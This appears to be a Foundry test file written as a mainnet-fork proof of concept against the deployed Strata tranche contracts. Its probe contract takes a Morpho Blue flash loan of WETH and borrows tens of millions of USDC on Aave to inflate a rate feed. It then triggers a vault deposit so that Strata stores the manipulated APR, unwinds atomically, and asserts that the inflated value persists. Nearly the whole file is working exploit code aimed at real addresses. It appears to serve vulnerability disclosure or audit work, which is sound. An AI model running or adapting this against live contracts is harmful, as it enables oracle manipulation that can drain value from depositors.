// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test, console2 } from "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC4626 } from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import { UD60x18 } from "@prb/math/src/ud60x18/ValueType.sol";

import { Accounting } from "../../../contracts/tranches/Accounting.sol";
import { AprPairFeed } from "../../../contracts/tranches/oracles/AprPairFeed.sol";
import { AaveAprPairProvider } from "../../../contracts/tranches/strategies/ethena/AaveAprPairProvider.sol";

interface IMorphoBlueFlash {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IAavePoolMorphoProbe {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf) external returns (uint256);
}

contract MorphoFundedLiveStrataProbe {
    IMorphoBlueFlash public immutable morpho;
    IAavePoolMorphoProbe public immutable aave;
    AaveAprPairProvider public immutable provider;
    Accounting public immutable accounting;
    IERC4626 public immutable triggerVault;
    IERC20 public immutable triggerAsset;
    IERC20 public immutable weth;
    IERC20 public immutable usdc;

    uint256 public providerTargetDuring;
    uint256 public storedAprTargetAfterSnapshot;
    uint256 public storedAprSrtAfterSnapshot;
    uint256 public triggerSharesMinted;
    uint256 public usdcBorrowAmount;

    constructor(
        IMorphoBlueFlash morpho_,
        IAavePoolMorphoProbe aave_,
        AaveAprPairProvider provider_,
        Accounting accounting_,
        IERC4626 triggerVault_,
        IERC20 weth_,
        IERC20 usdc_
    ) {
        morpho = morpho_;
        aave = aave_;
        provider = provider_;
        accounting = accounting_;
        triggerVault = triggerVault_;
        triggerAsset = IERC20(triggerVault_.asset());
        weth = weth_;
        usdc = usdc_;
    }

    function run(uint256 flashWeth, uint256 borrowUsdc, uint256 triggerDeposit) external {
        usdcBorrowAmount = borrowUsdc;
        morpho.flashLoan(address(weth), flashWeth, abi.encode(triggerDeposit));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(morpho), "only morpho");
        uint256 triggerDeposit = abi.decode(data, (uint256));

        weth.approve(address(aave), assets);
        aave.supply(address(weth), assets, address(this), 0);
        aave.borrow(address(usdc), usdcBorrowAmount, 2, 0, address(this));

        providerTargetDuring = uint256(uint64(provider.getAPRtarget()));

        triggerAsset.approve(address(triggerVault), triggerDeposit);
        triggerSharesMinted = triggerVault.deposit(triggerDeposit, address(this));
        storedAprTargetAfterSnapshot = UD60x18.unwrap(accounting.aprTarget());
        storedAprSrtAfterSnapshot = UD60x18.unwrap(accounting.aprSrt());

        usdc.approve(address(aave), type(uint256).max);
        aave.repay(address(usdc), type(uint256).max, 2, address(this));
        aave.withdraw(address(weth), type(uint256).max, address(this));

        weth.approve(address(morpho), assets);
    }
}

/// @notice Mainnet-fork proof that tests a fee-free external flash-liquidity route into
///         the real deployed Strata APR consumer. No transaction is broadcast.
contract AaveAprMorphoFlashLiveTest is Test {
    address internal constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant DEPLOYED_PROVIDER = 0x1c137776e04803F807616c382AbBA12d9BF0AF73;
    address internal constant DEPLOYED_FEED = 0x2bb416614D740E5313aA64A0E3e419B39e800EC2;
    address internal constant DEPLOYED_ACCOUNTING = 0xa436c5Dd1Ba62c55D112C10cd10E988bb3355102;
    address internal constant JRT = 0xC58D044404d8B14e953C115E67823784dEA53d8F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    AaveAprPairProvider internal provider;
    AprPairFeed internal feed;
    Accounting internal accounting;
    IAavePoolMorphoProbe internal aave;
    IERC20 internal usdc;
    IERC20 internal weth;
    IERC4626 internal jrt;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_ETH"));
        provider = AaveAprPairProvider(DEPLOYED_PROVIDER);
        feed = AprPairFeed(DEPLOYED_FEED);
        accounting = Accounting(DEPLOYED_ACCOUNTING);
        aave = IAavePoolMorphoProbe(address(provider.aave()));
        usdc = IERC20(provider.benchmarkTokens(0));
        weth = IERC20(WETH);
        jrt = IERC4626(JRT);
    }

    function test_morphoFeeFreeWethLiquidityCanFundLiveSnapshot() public {
        uint256 morphoWeth = weth.balanceOf(MORPHO_BLUE);
        uint256 targetBefore = uint256(uint64(provider.getAPRtarget()));
        uint256 seniorBefore = UD60x18.unwrap(accounting.aprSrt());
        uint256 storedTargetBefore = UD60x18.unwrap(accounting.aprTarget());
        uint256 triggerMaxDeposit = jrt.maxDeposit(address(this));

        console2.log("Morpho Blue WETH balance", morphoWeth);
        console2.log("provider target before (1e12)", targetBefore);
        console2.log("stored Strata target before (1e18)", storedTargetBefore);
        console2.log("stored Strata Senior APR before (1e18)", seniorBefore);
        console2.log("JRT max deposit for test caller", triggerMaxDeposit);
        console2.log("JRT base asset", jrt.asset());

        uint256 flashWeth;
        uint256 borrowUsdc;
        if (morphoWeth >= 63_000 ether) {
            flashWeth = 63_000 ether;
            borrowUsdc = 120_000_000e6;
        } else if (morphoWeth >= 25_000 ether) {
            flashWeth = 25_000 ether;
            borrowUsdc = 44_300_000e6;
        } else {
            console2.log("Morpho WETH insufficient even for threshold route");
            return;
        }

        MorphoFundedLiveStrataProbe receiver = new MorphoFundedLiveStrataProbe(
            IMorphoBlueFlash(MORPHO_BLUE),
            aave,
            provider,
            accounting,
            jrt,
            weth,
            usdc
        );

        IERC20 triggerAsset = IERC20(jrt.asset());
        uint256 triggerDeposit = 1e18;
        deal(address(triggerAsset), address(receiver), 10e18);
        deal(address(usdc), address(receiver), 1_000_000e6);

        receiver.run(flashWeth, borrowUsdc, triggerDeposit);

        uint256 targetDuring = receiver.providerTargetDuring();
        uint256 storedTarget = receiver.storedAprTargetAfterSnapshot();
        uint256 storedSenior = receiver.storedAprSrtAfterSnapshot();
        uint256 targetAfter = uint256(uint64(provider.getAPRtarget()));

        console2.log("Morpho flash WETH used", flashWeth);
        console2.log("Aave USDC borrow used", borrowUsdc);
        console2.log("provider target during attack (1e12)", targetDuring);
        console2.log("live Strata stored target after snapshot (1e18)", storedTarget);
        console2.log("live Strata stored Senior APR after snapshot (1e18)", storedSenior);
        console2.log("trigger JRT shares minted", receiver.triggerSharesMinted());
        console2.log("provider target after atomic unwind (1e12)", targetAfter);
        console2.log("stored target remains above honest provider", storedTarget / 1e6 > targetAfter);

        assertGt(targetDuring * 1e6, seniorBefore, "fee-free route did not make target binding");
        assertEq(storedTarget / 1e6, targetDuring, "live Strata did not snapshot manipulated target");
        assertEq(storedSenior, storedTarget, "manipulated target did not become stored Senior APR");
        assertLt(targetAfter, targetDuring, "external Aave state did not unwind");
        assertGt(storedTarget / 1e6, targetAfter, "manipulated APR did not persist in Strata after unwind");
    }
}
